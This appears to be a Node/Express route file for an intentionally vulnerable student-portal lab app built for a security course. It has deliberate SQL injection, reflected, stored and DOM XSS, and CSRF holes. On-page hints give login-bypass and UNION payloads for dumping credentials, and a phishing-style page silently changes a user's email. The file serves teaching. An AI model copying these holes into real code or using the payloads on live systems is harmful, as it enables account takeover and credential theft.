const express = require('express');
const router  = express.Router();
const { getDb } = require('../db/setup');
const { page, COLORS, initials } = require('../views/layout');

router.use((req, _res, next) => { req._mode = 'vulnerable'; next(); });

function auth(req, res, next) {
    if (!req.session.user) return res.redirect('/vulnerable/login');
    next();
}

// â”€â”€ Login â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

router.get('/login', (req, res) => {
    const err = req.query.error || '';
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login â€” FAST Portal</title>
<link rel="stylesheet" href="/css/portal.css">
</head>
<body>
<div class="login-wrap">

  <div class="login-panel">
    <div style="display:flex;align-items:center;gap:10px;margin-bottom:32px">
      <div style="width:36px;height:36px;background:rgba(255,255,255,.15);border:1.5px solid rgba(255,255,255,.4);border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px">F</div>
      <div>
        <div style="font-weight:700;font-size:14px">FAST NUCES</div>
        <div style="font-size:11px;opacity:.6">National University</div>
      </div>
    </div>
    <h2 style="font-size:20px;font-weight:700;margin-bottom:8px">Student Learning Portal</h2>
    <p style="font-size:13px;opacity:.65;line-height:1.6">Access courses, assignments, and grades from one place.</p>
    <div class="cred-table">
      <div style="font-size:11px;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;opacity:.5">Test Accounts</div>
      admin / admin123<br>
      ali / pass@123<br>
      zeeshan / zeeshan99
    </div>
    <div style="margin-top:auto;padding-top:32px">
      <span class="mode-pill vuln" style="font-size:10px">âš  Vulnerable Mode</span>
    </div>
  </div>

  <div class="login-form-area">
    <div class="login-box">
      <div class="login-heading">Sign in</div>
      <div class="login-sub">Use your FAST student credentials</div>
      ${err ? `<div class="alert alert-danger">${err}</div>` : ''}
      <form method="POST" action="/vulnerable/login">
        <div class="form-row">
          <label>Username</label>
          <input name="username" placeholder="e.g. admin" autocomplete="off">
        </div>
        <div class="form-row">
          <label>Password</label>
          <input type="password" name="password" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢">
        </div>
        <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;margin-top:4px">Sign In</button>
      </form>
      <div class="vuln-box" style="margin-top:18px">
        <b>SQLi Easy â€” Login Bypass</b>
        Username: <code>admin' OR '1'='1' --</code> &nbsp; Password: anything
      </div>
    </div>
  </div>

</div>
</body></html>`);
});

// VULNERABILITY: SQL INJECTION EASY â€” interpolated login query
router.post('/login', (req, res) => {
    const { username, password } = req.body;
    const db = getDb();
    const q = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    console.log('\n[vuln][sqli-easy]\n ', q, '\n');
    let user;
    try   { user = db.prepare(q).get(); }
    catch (e) { db.close(); return res.redirect('/vulnerable/login?error=' + encodeURIComponent('SQL Error: ' + e.message)); }
    db.close();
    if (!user) return res.redirect('/vulnerable/login?error=Invalid+username+or+password');
    req.session.user = { id: user.id, username: user.username, email: user.email, role: user.role };
    res.redirect('/vulnerable/dashboard');
});

router.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/vulnerable/login'); });

// â”€â”€ Dashboard â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

router.get('/dashboard', auth, (req, res) => {
    const db = getDb();
    const courses  = db.prepare('SELECT c.* FROM courses c JOIN enrollments e ON c.id=e.course_id WHERE e.user_id=?').all(req.session.user.id);
    const total    = db.prepare('SELECT COUNT(*) as n FROM courses').get().n;
    db.close();

    const cards = courses.length ? courses.map((c, i) => `
    <div class="course-card">
      <div class="course-stripe" style="background:${COLORS[i%COLORS.length]}"></div>
      <div class="course-body">
        <div class="course-name">${c.name}</div>
        <div class="course-inst">${c.instructor} &nbsp;Â·&nbsp; <span class="badge">${c.category}</span></div>
        <div class="course-desc">${(c.description||'').slice(0,80)}â€¦</div>
      </div>
      <div class="course-foot">
        <a href="/vulnerable/comments/${c.id}" class="btn btn-plain btn-sm">Discussion</a>
      </div>
    </div>`).join('')
    : `<p style="color:var(--text-2);font-size:13px;padding:8px 0">No enrollments found.</p>`;

    res.send(page('Dashboard', `
<div class="stats-row">
  <div class="stat"><div class="stat-num">${courses.length}</div><div class="stat-label">Enrolled</div></div>
  <div class="stat"><div class="stat-num">${total}</div><div class="stat-label">Total Courses</div></div>
  <div class="stat"><div class="stat-num">FA24</div><div class="stat-label">Semester</div></div>
  <div class="stat"><div class="stat-num">BST</div><div class="stat-label">Program</div></div>
</div>

<div class="card">
  <div class="card-header">
    <div><div class="card-title">My Courses</div><div class="card-sub">Enrolled this semester</div></div>
    <a href="/vulnerable/courses" class="btn btn-outline btn-sm">Browse All</a>
  </div>
  <div class="course-grid">${cards}</div>
</div>`, req, 'dashboard'));
});

// â”€â”€ Courses â€” Reflected XSS + SQLi Intermediate â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

router.get('/courses', auth, (req, res) => {
    const db = getDb();
    const q  = req.query.q || '';
    let courses = [], err = null;

    if (q) {
        // VULN: REFLECTED XSS â€” q printed raw into HTML
        // VULN: SQL INJECTION INTERMEDIATE â€” interpolated LIKE
        const sql = `SELECT * FROM courses WHERE name LIKE '%${q}%' OR category LIKE '%${q}%'`;
        console.log('\n[vuln][sqli-intermediate]\n ', sql, '\n');
        try   { courses = db.prepare(sql).all(); }
        catch (e) { err = e.message; }
    } else {
        courses = db.prepare('SELECT * FROM courses').all();
    }
    db.close();

    const rows = courses.map(c => `<tr>
      <td><strong>${c.name}</strong></td>
      <td><span class="badge">${c.category}</span></td>
      <td>${c.instructor}</td>
      <td style="color:var(--text-2)">${(c.description||'').slice(0,60)}</td>
      <td><a href="/vulnerable/comments/${c.id}" class="btn btn-plain btn-sm">Discussion</a></td>
    </tr>`).join('') || '<tr><td colspan="5" style="text-align:center;color:var(--text-2);padding:16px">No results</td></tr>';

    res.send(page('Courses', `
<div class="card">
  <div class="card-header">
    <div><div class="card-title">Course Catalog</div><div class="card-sub">Search available courses</div></div>
  </div>
  <form method="GET" style="display:flex;gap:8px;margin-bottom:16px">
    <input name="q" value="${q}" placeholder="Search by name or categoryâ€¦" style="flex:1">
    <button type="submit" class="btn btn-primary">Search</button>
  </form>
  ${q ? `<p style="font-size:13px;color:var(--text-2);margin-bottom:12px">Results for: ${q}</p>` : ''}
  ${err ? `<div class="alert alert-danger">Error: ${err}</div>` : ''}
  <div class="table-wrap">
    <table>
      <thead><tr><th>Course</th><th>Category</th><th>Instructor</th><th>Description</th><th></th></tr></thead>
      <tbody>${rows}</tbody>
    </table>
  </div>
  <div class="vuln-box">
    <b>Reflected XSS</b> Search: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
    &nbsp;&nbsp; <b>SQLi Intermediate</b> Search: <code>%' AND 1=1 --</code>
  </div>
</div>

<div class="card">
  <div class="card-header">
    <div><div class="card-title">SQLi Advanced â€” UNION Attack</div></div>
  </div>
  <form method="GET" action="/vulnerable/courses/filter" style="display:flex;gap:8px;margin-bottom:14px">
    <input name="cat" placeholder="Category (e.g. CS)" style="flex:1">
    <button type="submit" class="btn btn-primary">Filter</button>
  </form>
  <div class="vuln-box">
    <b>Step-by-step chain</b>
    <div style="line-height:2;margin-top:6px">
      1. Confirm columns: <code>CS' ORDER BY 5--</code><br>
      2. List tables: <code>CS' UNION SELECT null,name,null,null,null FROM sqlite_master WHERE type='table'--</code><br>
      3. Get schema: <code>CS' UNION SELECT null,sql,null,null,null FROM sqlite_master WHERE name='users'--</code><br>
      4. Dump creds: <code>CS' UNION SELECT null,username,password,null,null FROM users--</code>
    </div>
  </div>
</div>`, req, 'courses'));
});

// VULNERABILITY: SQL INJECTION ADVANCED
router.get('/courses/filter', auth, (req, res) => {
    const cat = req.query.cat || '';
    const db  = getDb();
    const sql = `SELECT id, name, category, instructor, description FROM courses WHERE category='${cat}'`;
    console.log('\n[vuln][sqli-advanced]\n ', sql, '\n');
    let rows = [], err = null;
    try   { rows = db.prepare(sql).all(); }
    catch (e) { err = e.message; }
    db.close();

    const trs = rows.map(r => `<tr>
      <td style="font-family:var(--mono);font-size:11.5px">${r.id}</td>
      <td><strong>${r.name}</strong></td>
      <td>${r.category}</td>
      <td>${r.instructor}</td>
      <td style="color:var(--text-2)">${r.description||''}</td>
    </tr>`).join('') || '<tr><td colspan="5" style="text-align:center;padding:14px;color:var(--text-2)">No results</td></tr>';

    res.send(page('SQLi Advanced', `
<div class="card">
  <div class="card-header">
    <div><div class="card-title">Category Filter â€” SQLi Advanced</div></div>
    <a href="/vulnerable/courses" class="btn btn-plain btn-sm">â† Back</a>
  </div>
  <form method="GET" style="display:flex;gap:8px;margin-bottom:14px">
    <input name="cat" value="${cat}" placeholder="Category" style="flex:1">
    <button type="submit" class="btn btn-primary">Filter</button>
  </form>
  <div class="code-block">${sql.replace(/</g,'&lt;')}</div>
  ${err ? `<div class="alert alert-danger" style="margin-top:10px">Error: ${err}</div>` : ''}
  <div class="table-wrap" style="margin-top:12px">
    <table>
      <thead><tr><th>ID</th><th>Name / Injected</th><th>Category</th><th>Instructor</th><th>Description</th></tr></thead>
      <tbody>${trs}</tbody>
    </table>
  </div>
</div>`, req, 'courses'));
});

// â”€â”€ Comments â€” Stored XSS + DOM XSS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

router.get('/comments/:id', auth, (req, res) => {
    const db     = getDb();
    const course = db.prepare('SELECT * FROM courses WHERE id=?').get(req.params.id);
    if (!course) { db.close(); return res.status(404).send('Not found'); }
    const list = db.prepare(`SELECT c.content, u.username, c.created_at FROM comments c
        JOIN users u ON c.user_id=u.id WHERE c.course_id=? ORDER BY c.created_at DESC`).all(req.params.id);
    db.close();

    // STORED XSS: content inserted raw â€” executes when any user views this page
    const comments = list.map(c => `
    <div class="comment">
      <div class="c-avatar">${initials(c.username)}</div>
      <div class="c-body">
        <div class="c-header"><span class="c-author">${c.username}</span><span class="c-time">${c.created_at}</span></div>
        <div class="c-text">${c.content}</div>
      </div>
    </div>`).join('') || `<p style="color:var(--text-2);font-size:13px">No comments yet.</p>`;

    res.send(page(course.name, `
<div class="card" style="margin-bottom:14px">
  <div style="font-size:12.5px;color:var(--text-2);margin-bottom:10px"><a href="/vulnerable/courses">â† Courses</a></div>
  <div class="card-title" style="font-size:17px">${course.name}</div>
  <div style="font-size:13px;color:var(--text-2);margin-top:3px">${course.instructor} &nbsp;Â·&nbsp; ${course.category}</div>
  <p style="margin-top:10px;font-size:13px;color:var(--text-2)">${course.description||''}</p>
</div>

<div class="card" style="margin-bottom:14px">
  <div class="card-title" style="margin-bottom:16px">Discussion (${list.length})</div>
  <div class="comment-list">${comments}</div>
  <hr class="sep">
  <div style="font-size:13px;font-weight:600;margin-bottom:10px">Post a Comment</div>
  <form method="POST" action="/vulnerable/comments/${req.params.id}">
    <div class="form-row">
      <textarea name="content" placeholder="Write your commentâ€¦"></textarea>
    </div>
    <button type="submit" class="btn btn-primary">Post</button>
  </form>
  <div class="vuln-box">
    <b>Stored XSS â€” paste in comment box</b>
    <code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code> &nbsp; or &nbsp; <code>&lt;img src=x onerror=alert(1)&gt;</code>
  </div>
</div>

<div class="card">
  <div class="card-title" style="margin-bottom:8px">DOM-Based XSS</div>
  <p style="font-size:13px;color:var(--text-2);margin-bottom:10px">
    The page reads <code>location.hash</code> and writes it to <code>innerHTML</code>. Add a payload as the URL hash:
  </p>
  <div class="code-block">â€¦/comments/${req.params.id}<strong style="color:#f6d68c">#&lt;img src=x onerror=alert('DOM XSS')&gt;</strong></div>
  <div id="dom-out" style="margin-top:12px;font-size:13.5px;font-weight:500;color:var(--ok)"></div>
  <script>
    // VULNERABILITY: DOM-based XSS â€” innerHTML with raw location.hash
    var h = decodeURIComponent(location.hash.slice(1));
    if (h) document.getElementById('dom-out').innerHTML = 'Note: ' + h;
  <\/script>
  <div class="vuln-box">
    <b>DOM XSS hash payload</b>
    <code>#&lt;img src=x onerror=alert('DOM XSS')&gt;</code>
  </div>
</div>`, req, 'courses'));
});

router.post('/comments/:id', auth, (req, res) => {
    const db = getDb();
    // STORED XSS: no sanitization
    db.prepare('INSERT INTO comments (user_id, course_id, content) VALUES (?,?,?)').run(req.session.user.id, req.params.id, req.body.content);
    db.close();
    res.redirect(`/vulnerable/comments/${req.params.id}`);
});

// â”€â”€ Profile â€” CSRF â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

router.get('/profile', auth, (req, res) => {
    const u = req.session.user;
    res.send(page('Profile', `
<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">

  <div class="card">
    <div class="card-title" style="margin-bottom:16px">Account</div>
    <div style="display:flex;align-items:center;gap:12px;margin-bottom:18px;padding-bottom:18px;border-bottom:1px solid var(--border)">
      <div style="width:44px;height:44px;border-radius:50%;background:var(--green);color:#fff;font-weight:700;font-size:16px;display:flex;align-items:center;justify-content:center">${initials(u.username)}</div>
      <div>
        <div style="font-weight:600;font-size:15px">${u.username}</div>
        <div style="font-size:12px;color:var(--text-2);text-transform:capitalize">${u.role}</div>
      </div>
    </div>
    <div style="display:grid;gap:10px;font-size:13px">
      <div style="display:flex;justify-content:space-between"><span style="color:var(--text-2)">Email</span><span>${u.email}</span></div>
      <div style="display:flex;justify-content:space-between"><span style="color:var(--text-2)">Program</span><span>BS Telecom</span></div>
      <div style="display:flex;justify-content:space-between"><span style="color:var(--text-2)">Semester</span><span>FA24</span></div>
    </div>
  </div>

  <div class="card">
    <div class="card-title" style="margin-bottom:14px">Change Email</div>
    <!-- VULNERABILITY: no CSRF token -->
    <form method="POST" action="/vulnerable/profile/update-email">
      <div class="form-row">
        <label>New Email</label>
        <input type="email" name="email" placeholder="new@nu.edu.pk">
      </div>
      <button type="submit" class="btn btn-primary">Update</button>
    </form>
    <div class="vuln-box">
      <b>CSRF Attack</b>
      <a href="/vulnerable/csrf-demo" target="_blank" class="btn btn-danger btn-sm" style="margin-top:8px;display:inline-flex">Open Attacker Page â†’</a>
    </div>
  </div>

</div>`, req, 'profile'));
});

// VULNERABILITY: CSRF â€” no token, any origin can trigger email change
router.post('/profile/update-email', auth, (req, res) => {
    const db = getDb();
    db.prepare('UPDATE users SET email=? WHERE id=?').run(req.body.email, req.session.user.id);
    db.close();
    req.session.user.email = req.body.email;
    res.redirect('/vulnerable/profile');
});

// Attacker page (same origin â€” permitted by assignment)
router.get('/csrf-demo', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Prize Claim</title>
<link rel="stylesheet" href="/css/portal.css">
</head>
<body style="background:var(--bg)">
<div style="max-width:460px;margin:80px auto;padding:0 20px">
  <div class="card" style="border-top:3px solid var(--red);text-align:center;padding:32px 28px">
    <div style="font-size:40px;margin-bottom:12px">ðŸŽ</div>
    <h2 style="font-size:18px;margin-bottom:8px">Congratulations!</h2>
    <p style="font-size:13px;color:var(--text-2);margin-bottom:24px;line-height:1.6">
      You have been selected for a FAST scholarship. Click below to register your email address.
    </p>
    <!-- CSRF: hidden form posts to vulnerable endpoint â€” no token required -->
    <form method="POST" action="/vulnerable/profile/update-email">
      <input type="hidden" name="email" value="hacked@attacker.com">
      <button type="submit" class="btn btn-danger" style="width:100%;justify-content:center">
        Claim Scholarship
      </button>
    </form>
    <p style="font-size:12px;color:var(--text-3);margin-top:14px">
      After clicking, check your <a href="/vulnerable/profile">profile</a> â€” email changed with no CSRF token.
    </p>
  </div>
</div>
</body></html>`);
});

// built by Zeeshan Khan â€” 23F-0553

module.exports = router;

